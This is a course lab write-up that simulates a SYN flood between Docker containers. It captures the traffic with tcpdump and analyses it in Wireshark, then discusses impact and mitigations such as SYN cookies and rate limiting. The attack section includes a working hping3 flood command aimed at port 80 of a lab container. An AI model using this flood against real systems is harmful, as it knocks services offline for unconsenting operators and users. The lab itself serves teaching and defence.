# SYN Flood Attack Simulation with Docker: Lab Setup and Traffic Analysis

**Hands-on experience with SYN flood attacks and network traffic analysis**  
*Erwin Bruno - July 26, 2026*  
*Secure Network Engineering (CYBR-508-02P)*

## Objective

This lab provides hands-on experience with SYN flood attacks, a common form of Denial of Service (DoS). It guides you through building a Docker-based testing environment and developing skills in network traffic analysis using tcpdump and Wireshark.

## Prerequisites

- Docker Desktop installed and running
- Wireshark installed on host system
- Basic understanding of TCP/IP protocols
- Command line familiarity (bash/terminal)
- Administrative privileges for Docker operations
- Windows/Linux/macOS host system

## Lab Setup

### Create Docker Network
Create a custom bridge network for isolated testing:
```bash
docker network create --driver bridge syn_flood_network
```

### Deploy Target Container
Create NGINX target with resource constraints:
```bash
docker run -dit --name target --network syn_flood_network --cpus="0.2" --memory="256m" --cap-add=NET_ADMIN nginx
```

### Configure Target Environment
Enter the target container:
```bash
docker exec -it target bash
```

Update and install required tools:
```bash
apt update && apt install iproute2 -y
```

Apply bandwidth throttling:
```bash
tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
```

Prepare capture directory and install tcpdump:
```bash
mkdir -p /mnt/data
apt update && apt install tcpdump -y
```

### Deploy Attacker Container
Create and enter the attacker container:
```bash
docker run -it --name attacker --network syn_flood_network ubuntu /bin/bash
```

Install attack tools:
```bash
apt update && apt install hping3 -y
```

## Attack Execution

### Launch SYN Flood Attack
From inside the attacker container, execute the flood:
```bash
hping3 --flood --syn --destport 80 target
```

### Packet Capture (Target Container)
In a separate terminal, capture SYN packets on target:
```bash
tcpdump -i eth0 'tcp[tcpflags] == tcp-syn' and not port 22 -w /mnt/data/syn_flood_capture.pcap
```

Stop capture with `Ctrl+C` when sufficient data is collected.

### Traffic Analysis
Copy PCAP file to host system (replace `{Username}` with actual username):
```bash
docker cp target:/mnt/data/syn_flood_capture.pcap C:\Users\{Username}\Downloads
```

Open the captured file with Wireshark for detailed analysis.

## Cleanup

Remove all lab components:
```bash
docker container stop target attacker
docker container rm target attacker
docker network rm syn_flood_network
```

## Results and Observations

The SYN flood attack successfully demonstrated service disruption through connection table exhaustion. Wireshark analysis revealed continuous SYN packet transmission with no corresponding SYN-ACK responses, confirming the attack's effectiveness.

### Key Findings
* Connection attempts from attacker were not properly completed
* TCP three-way handshake process was disrupted
* Server resources were consumed managing half-open connections
* Legitimate traffic would be impacted due to connection table exhaustion
* Continuous SYN packets observed without proper connection establishment

## Real-World Implications

### Network Infrastructure Threats
SYN flood attacks pose significant threats because they require minimal attacker resources while overwhelming servers with limited connection handling capacity. They are difficult to distinguish from legitimate high-traffic periods initially.

### Organizations at Risk
* Small businesses with limited server resources
* IoT device manufacturers with minimal security implementations
* Legacy systems without modern TCP stack protections
* Services without proper rate limiting or DDoS protection

### Business Impact
Successful SYN flood attacks can result in service unavailability during peak business hours, revenue loss for e-commerce platforms, customer dissatisfaction and reputation damage, and increased operational costs for incident response.

## Defense Strategies

### Technical Mitigations
* **SYN Cookies**: Enable SYN cookie functionality to handle connection state without memory allocation
* **Rate Limiting**: Implement connection rate limits per source IP
* **Timeout Reduction**: Decrease SYN_RECV timeout values to free resources faster
* **iptables Rules**: Configure firewall rules to detect and block flood patterns

### Infrastructure Solutions
* **Load Balancers**: Deploy reverse proxies with DDoS protection capabilities
* **Cloud Security**: Utilize cloud-based DDoS mitigation services
* **Network Monitoring**: Implement real-time traffic analysis and alerting
* **Resource Scaling**: Design systems with auto-scaling capabilities

## Educational Value

This lab demonstrates:
* **Attack Methodology**: Understanding how SYN flood attacks exploit TCP protocol weaknesses
* **Traffic Analysis**: Developing skills in packet capture and analysis using industry-standard tools
* **Containerization**: Utilizing Docker for safe, isolated security testing environments
* **Network Security**: Recognizing DoS attack patterns and their impact on network infrastructure
* **Defensive Thinking**: Understanding attack vectors to implement appropriate countermeasures

## Disclaimer

⚠️ **For Educational Purposes Only**  
This lab is designed for educational and authorized testing environments only. SYN flood attacks are illegal when performed against systems without explicit permission. Always ensure you have proper authorization before conducting any security testing. Use this knowledge responsibly to improve defensive security postures.
